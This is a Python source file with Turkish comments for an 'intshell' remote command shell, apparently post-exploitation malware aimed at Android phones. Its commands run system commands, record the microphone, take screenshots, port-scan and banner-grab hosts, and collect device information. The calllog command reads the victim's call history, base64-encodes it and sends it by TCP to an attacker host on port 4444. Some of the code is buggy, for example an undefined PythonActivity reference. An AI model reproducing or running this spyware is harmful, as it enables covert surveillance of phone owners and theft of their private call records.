import os
import sys
import socket
import threading
import base64
import argparse
from modules.post.all.exec import handle_exec
import pyaudio
import pyautogui  # Ekran görüntüsü almak için
from jnius import autoclass

ARCHIVE_DIR = 'recon_archive'
BUFFER_SIZE = 4096  # Buffer size for receiving data
TIMEOUT = 3  # Timeout for socket connections (in seconds)

# Ensure the archive directory exists
if not os.path.exists(ARCHIVE_DIR):
    os.makedirs(ARCHIVE_DIR)

# Thread lock to avoid race conditions when writing files
lock = threading.Lock()

class ShellHandler:
    def __init__(self):
        self.prompt = "intshell > "
        self.commands = {
            "exec": self.run_exec,
            "micrecord": self.run_micrecord,
            "recon": self.run_recon,
            "screenshot": self.run_screenshot,
            "calllog": self.run_calllog,  # Yeni komut
            "sysinfo": self.run_sysinfo,  # Yeni komut
            "help": self.run_help,        # Yeni komut
            # Diğer shell komutları
        }

    def run_exec(self, args):
        """Exec komutunu çalıştırır ve çıktı verir."""
        try:
            handle_exec(args)
        except Exception as e:
            print(f"Error running exec: {str(e)}")

    def run_micrecord(self, args):
        """Mikrofon kaydını başlatan komut."""
        total_duration = int(args[0]) if args else 10  # Varsayılan 10 saniye
        chunk_duration = int(args[1]) if len(args) > 1 else 5  # Varsayılan 5 saniye
        self.record_audio(total_duration, chunk_duration)

    def record_audio(self, total_duration=10, chunk_duration=5):
        """Mikrofon kaydı yapan fonksiyon."""
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100
        CHUNK = 1024
        
        try:
            audio = pyaudio.PyAudio()
            stream = audio.open(format=FORMAT, channels=CHANNELS,
                                rate=RATE, input=True,
                                frames_per_buffer=CHUNK)
            print("Recording started...")

            for k in range(0, int(total_duration / chunk_duration)):
                data = b""
                for j in range(0, int(chunk_duration)):
                    for i in range(0, int(RATE / CHUNK * 1)):
                        data += stream.read(CHUNK)
                print(f"Chunk {k+1} recorded.")
                # Kaydedilen veriyi burada işleyebilirsiniz (istemciye gönderme vs.)

            print("Recording finished")
        finally:
            stream.stop_stream()
            stream.close()
            audio.terminate()

    def run_recon(self, args):
        """Recon komutunu çalıştırır."""
        target_ip = args[0]
        recon_commands = args[1:]

        # Execute reconnaissance commands
        output = self.execute_recon_commands(recon_commands, target_ip)

        # Save or print the output
        write_file = None
        if '-o' in recon_commands:
            write_index = recon_commands.index('-o')
            if len(recon_commands) > write_index + 1:
                write_file = recon_commands[write_index + 1]
            recon_commands = recon_commands[:write_index]

        if write_file:
            self.save_output(write_file, output)
        else:
            print(output)

    def execute_recon_commands(self, commands, target_ip):
        """Recon komutlarını çalıştırır ve çıktı alır."""
        output = ""
        for cmd in commands:
            try:
                print(f"Executing: {cmd}")
                cmd_output = self.run_recon_command(cmd, target_ip)
                output += f"$ {cmd}\n{cmd_output}\n{'='*40}\n"
            except Exception as e:
                output += f"Error executing command {cmd}: {str(e)}\n"
        return output

    def run_recon_command(self, command, target_ip):
        """Port taraması ve servis sürümü gibi reconnaissance komutlarını çalıştırır."""
        if command == "port_scan":
            open_ports = self.port_scan(target_ip)
            return f"Open ports: {', '.join(map(str, open_ports))}"
        elif command.startswith("service_version"):
            port = int(command.split()[1])
            service_info = self.get_service_version(target_ip, port)
            return f"Service on port {port}: {service_info}"
        else:
            return f"Unknown command: {command}"

    def port_scan(self, target_ip, start_port=1, end_port=1024):
        """Hedef sistem üzerinde port taraması yapar."""
        open_ports = []
        for port in range(start_port, end_port):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(TIMEOUT)
                    result = s.connect_ex((target_ip, port))
                    if result == 0:
                        open_ports.append(port)
            except socket.error:
                pass
        return open_ports

    def get_service_version(self, target_ip, port):
        """Açık portta çalışan servisin sürümünü alır."""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(TIMEOUT)
                s.connect((target_ip, port))
                s.send(b'HEAD / HTTP/1.0\r\n\r\n')
                service = s.recv(1024).decode('utf-8')
            return service
        except Exception as e:
            return f"Error: {str(e)}"

    def run_screenshot(self, args):
        """Ekran görüntüsü alır."""
        screenshot = pyautogui.screenshot()
        screenshot_filename = "screenshot.png"
        screenshot.save(screenshot_filename)
        print(f"Screenshot saved as {screenshot_filename}")

    def save_output(self, filename, data):
        """Veriyi bir dosyaya kaydeder."""
        with lock:
            try:
                with open(f"{ARCHIVE_DIR}/{filename}", "w") as f:
                    f.write(data)
                print(f"Output saved to {ARCHIVE_DIR}/{filename}")
            except Exception as e:
                print(f"Error saving output: {str(e)}")

    def get_call_details(self):
        """Fetches call details from the Android call log."""
        calls = []
        Calls = autoclass('android.provider.CallLog$Calls')
        PythonActivity = autoclass('org.renpy.android.PythonService')
        cursor = PythonActivity.mService.getContentResolver().query(Calls.CONTENT_URI, None, None, None, Calls.DATE + " DESC")
        calls_count = cursor.getCount()
        if calls_count > 0:
            while cursor.moveToNext():
                ph_num = cursor.getString(cursor.getColumnIndex(Calls.NUMBER))
                call_type_code = cursor.getString(cursor.getColumnIndex(Calls.TYPE))
                call_date = cursor.getString(cursor.getColumnIndex(Calls.DATE))
                call_duration = cursor.getString(cursor.getColumnIndex(Calls.DURATION))
                calls.append({'phNum': ph_num, 'callTypeC': call_type_code, 'callDate': call_date, 'callDuration': call_duration})
        cursor.close()
        return calls

    def send_call_details(self, calls, target_ip="192.168.1.100", target_port=4444):
        """Send the collected call details to a remote system via TCP."""
        encoded_calls = base64.b64encode(str(calls).encode('utf-8')).decode('utf-8')

        # Send the data via TCP
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((target_ip, target_port))
            s.sendall(encoded_calls.encode('utf-8'))
            print(f"[INFO] Call details sent to {target_ip}:{target_port}")

    def run_calllog(self, args):
        """Call log komutunu çalıştırır."""
        target_ip = args[0]
        target_port = int(args[1])
        
        call_details = self.get_call_details()
        self.send_call_details(call_details, target_ip, target_port)

    def run_sysinfo(self, args):
        """Sistem bilgilerini alır."""
        sys_info = self.get_system_info()
        print(sys_info)

    def get_system_info(self):
        """Cihazın sistem bilgilerini alır."""
        try:
            # Android cihazının sistem bilgilerini almak için gerekli kütüphaneleri kullanıyoruz
            Build = autoclass('android.os.Build')
            Runtime = autoclass('java.lang.Runtime')

            system_info = {
                "Model": Build.MODEL,
                "Manufacturer": Build.MANUFACTURER,
                "Android Version": Build.VERSION.RELEASE,
                "API Level": Build.VERSION.SDK_INT,
                "Total RAM": self.get_total_ram(),
                "CPU": self.get_cpu_info(),
            }
            return str(system_info)
        except Exception as e:
            return f"Error fetching system info: {str(e)}"

    def get_total_ram(self):
        """Cihazın toplam RAM miktarını alır."""
        try:
            ActivityManager = autoclass('android.app.ActivityManager')
            Context = autoclass('android.content.Context')
            context = PythonActivity.mService.getApplicationContext()
            activity_manager = context.getSystemService(Context.ACTIVITY_SERVICE)
            mem_info = ActivityManager.MemoryInfo()
            activity_manager.getMemoryInfo(mem_info)
            return mem_info.totalMem / (1024 * 1024 * 1024)  # GB cinsinden
        except Exception as e:
            return f"Error fetching total RAM: {str(e)}"
    def get_cpu_info(self):
        """Cihazın CPU bilgilerini alır."""
        try:
            # CPU bilgilerini almak için gerekli kütüphaneleri kullanıyoruz
            Build = autoclass('android.os.Build')
            cpu_info = Build.HARDWARE
            return cpu_info
        except Exception as e:
            return f"Error fetching CPU info: {str(e)}"

    def run_help(self, args):
        """Yardım komutunu çalıştırır."""
        help_text = """
        Available Commands:
        - exec <command>: Execute a system command.
        - micrecord <duration> <chunk_duration>: Record audio for the given duration and chunk size.
        - recon <target_ip> <commands>: Run reconnaissance commands like 'port_scan' and 'service_version <port>'.
        - screenshot: Take a screenshot and save it as a PNG file.
        - calllog <target_ip> <target_port>: Get call log details from the device and send them to the target IP.
        - sysinfo: Get system information about the device, including model, Android version, CPU, and RAM.
        - help: Display this help message.
        """
        print(help_text)

    def handle_input(self):
        """Kullanıcının komutları girmesini bekler ve işler."""
        while True:
            try:
                user_input = input(self.prompt).strip()
                if user_input.lower() == "exit":
                    print("Exiting...")
                    break
                elif user_input:
                    self.process_command(user_input)
            except KeyboardInterrupt:
                print("\nExiting...")
                break

    def process_command(self, user_input):
        """Kullanıcının komutunu işler ve uygun fonksiyonu çağırır."""
        args = user_input.split()
        command = args[0]

        if command in self.commands:
            try:
                self.commands[command](args[1:])
            except Exception as e:
                print(f"Error processing command {command}: {str(e)}")
        else:
            print(f"Unknown command: {command}. Type 'help' for a list of commands.")

if __name__ == "__main__":
    shell_handler = ShellHandler()
    shell_handler.handle_input()

